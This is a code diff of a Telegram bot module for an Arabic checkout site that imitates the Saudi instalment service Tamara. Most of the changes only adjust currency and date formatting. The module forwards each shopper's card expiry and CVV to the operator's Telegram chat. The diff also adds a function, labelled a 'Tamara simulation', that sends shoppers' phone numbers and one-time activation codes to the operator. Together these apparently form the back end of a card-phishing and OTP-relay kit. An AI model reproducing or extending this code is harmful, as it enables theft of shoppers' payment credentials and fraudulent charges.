@@ -127,7 +127,7 @@ const setupCommands = () => {
 
       const text = orders.map((o, i) =>
         `${i + 1}. #${o.id} | ${o.user.name} | ${o.product.name}\n` +
-        `   💰 ${o.amount.toLocaleString('ar-SA')} ر.س | ${statusEmoji(o.status)} ${translateStatus(o.status)}\n` +
+        `   💰 ${o.amount.toLocaleString('en-US')} ر.س | ${statusEmoji(o.status)} ${translateStatus(o.status)}\n` +
         `   📅 ${formatDate(o.createdAt)}`
       ).join('\n\n');
 
@@ -247,12 +247,12 @@ const setupCommands = () => {
         `📧 الإيميل: ${order.user.email}\n` +
         `📱 الهاتف: ${order.user.phone || 'غير محدد'}\n\n` +
         `🛍️ المنتج: ${order.product.name}\n` +
-        `💰 المبلغ: ${order.amount.toLocaleString('ar-SA')} ر.س\n` +
+        `💰 المبلغ: ${order.amount.toLocaleString('en-US')} ر.س\n` +
         `💳 طريقة الدفع: تمارا\n` +
         `📊 الأقساط: ${order.installments === 1 ? 'دفعة كاملة' : `${order.installments} أقساط`}\n` +
-        `💵 كل دفعة: ${order.perInstallment.toLocaleString('ar-SA')} ر.س\n` +
-        `🏦 العمولة: ${order.commission.toLocaleString('ar-SA')} ر.س\n` +
-        `💼 صافي التحويل: ${order.netTransfer.toLocaleString('ar-SA')} ر.س\n\n` +
+        `💵 كل دفعة: ${order.perInstallment.toLocaleString('en-US')} ر.س\n` +
+        `🏦 العمولة: ${order.commission.toLocaleString('en-US')} ر.س\n` +
+        `💼 صافي التحويل: ${order.netTransfer.toLocaleString('en-US')} ر.س\n\n` +
         `${statusEmoji(order.status)} الحالة: ${translateStatus(order.status)}\n` +
         `💳 حالة الدفع: ${order.paymentStatus === 'paid' ? '✅ مدفوع' : order.paymentStatus === 'failed' ? '❌ فاشل' : '⏳ معلق'}\n` +
         `📅 التاريخ: ${formatDate(order.createdAt)}`;
@@ -318,7 +318,7 @@ const setupCommands = () => {
         `✅ موافق عليها: ${approved}\n` +
         `❌ مرفوضة: ${rejected}\n` +
         `🏆 مكتملة: ${completed}\n\n` +
-        `💰 إجمالي الإيرادات: ${(revenue._sum.netTransfer || 0).toLocaleString('ar-SA')} ر.س`;
+        `💰 إجمالي الإيرادات: ${(revenue._sum.netTransfer || 0).toLocaleString('en-US')} ر.س`;
 
       bot.sendMessage(chatId, text, {
         reply_markup: {
@@ -346,12 +346,12 @@ const sendNewOrderNotification = async (order) => {
     `الاسم: ${order.userName}\n` +
     `الإيميل: ${order.userEmail}\n` +
     `المنتج: ${order.productName}\n` +
-    `السعر: ${order.amount.toLocaleString('ar-SA')} ر.س\n` +
+    `السعر: ${order.amount.toLocaleString('en-US')} ر.س\n` +
     `الدفع: تمارا\n` +
     `الأقساط: ${order.installments === 1 ? 'دفعة كاملة' : order.installments}\n` +
-    `كل دفعة: ${order.perInstallment.toLocaleString('ar-SA')} ر.س\n` +
-    `العمولة: ${order.commission.toLocaleString('ar-SA')} ر.س\n` +
-    `صافي: ${order.netTransfer.toLocaleString('ar-SA')} ر.س\n\n` +
+    `كل دفعة: ${order.perInstallment.toLocaleString('en-US')} ر.س\n` +
+    `العمولة: ${order.commission.toLocaleString('en-US')} ر.س\n` +
+    `صافي: ${order.netTransfer.toLocaleString('en-US')} ر.س\n\n` +
     `ID: ORDER-${order.id}`;
 
   try {
@@ -387,9 +387,7 @@ const sendCheckoutEventNotification = async (event) => {
 
   const { sessionId, eventType, userName, userEmail, productName, productPrice, paymentMethod, installments, phoneMasked, orderId, paymentStatus } = event;
 
-  const formatPrice = (p) => new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);
-
-  // Event type labels in Arabic
+  const formatPrice = (p) => new Intl.NumberFormat('en-US', { style: 'decimal', minimumFractionDigits: 0 }).format(p) + ' ر.س';
   const eventLabels = {
     product_selected: '🛍️ اختيار المنتج',
     checkout_started: '🛒 بدء الدفع',
@@ -472,7 +470,7 @@ const sendCardApprovalRequest = async (event) => {
 
   const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked, cardLast4, cardExpiry, cardCvv, timestamp } = event;
 
-  const formatPrice = (p) => new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);
+  const formatPrice = (p) => new Intl.NumberFormat('en-US', { style: 'decimal', minimumFractionDigits: 0 }).format(p) + ' ر.س';
 
   const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
   const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod || '—';
@@ -529,7 +527,7 @@ const sendCodeVerificationRequest = async (event, verificationCode) => {
 
   const { sessionId, userName, userEmail, productName, amount, paymentMethod, installments, phoneMasked } = event;
 
-  const formatPrice = (p) => new Intl.NumberFormat('ar-SA', { style: 'currency', currency: 'SAR', minimumFractionDigits: 2 }).format(p);
+  const formatPrice = (p) => new Intl.NumberFormat('en-US', { style: 'decimal', minimumFractionDigits: 0 }).format(p) + ' ر.س';
 
   const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
   const methodLabel = paymentMethod === 'tamara' ? 'تمارا' : paymentMethod || '—';
@@ -579,6 +577,34 @@ const sendCodeVerificationRequest = async (event, verificationCode) => {
   }
 };
 
+// Send activation code to admin (Tamara simulation)
+const sendActivationCode = async (event, activationCode) => {
+  if (!bot || !OWNER_CHAT_ID) return;
+
+  const { sessionId, userName, userEmail, phoneNumber } = event;
+
+  const sessionShort = sessionId ? sessionId.substring(0, 8) : '—';
+
+  let text = '🔐 كود التفعيل - تمارا\n';
+  text += '━━━━━━━━━━━━━━━━━━━━\n\n';
+
+  text += `👤 العميل: ${userName || '—'}\n`;
+  text += `📱 الرقم: ${phoneNumber || '—'}\n`;
+  text += `🔢 الكود: <code>${activationCode}</code>\n\n`;
+  text += `⏰ صلاحية الكود: 5 دقائق\n`;
+  text += '\n';
+  text += `🆔 Session: ${sessionShort}...\n`;
+  text += `📅 ${formatDate(new Date())}\n`;
+
+  try {
+    await bot.sendMessage(OWNER_CHAT_ID, text, {
+      parse_mode: 'HTML',
+    });
+  } catch (err) {
+    console.error('[Telegram] sendActivationCode error:', err.message);
+  }
+};
+
 const getBot = () => bot;
 
 const statusEmoji = (status) => {
@@ -591,6 +617,6 @@ const translateStatus = (status) => {
   return map[status] || status;
 };
 
-const formatDate = (date) => new Date(date).toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
+const formatDate = (date) => new Date(date).toLocaleString('en-US', { timeZone: 'Asia/Riyadh' });
 
-module.exports = { init, stopBot, getBot, sendNewOrderNotification, sendPaymentStatusNotification, sendCheckoutEventNotification, sendCardApprovalRequest, sendCodeVerificationRequest };
+module.exports = { init, stopBot, getBot, sendNewOrderNotification, sendPaymentStatusNotification, sendCheckoutEventNotification, sendCardApprovalRequest, sendCodeVerificationRequest, sendActivationCode };
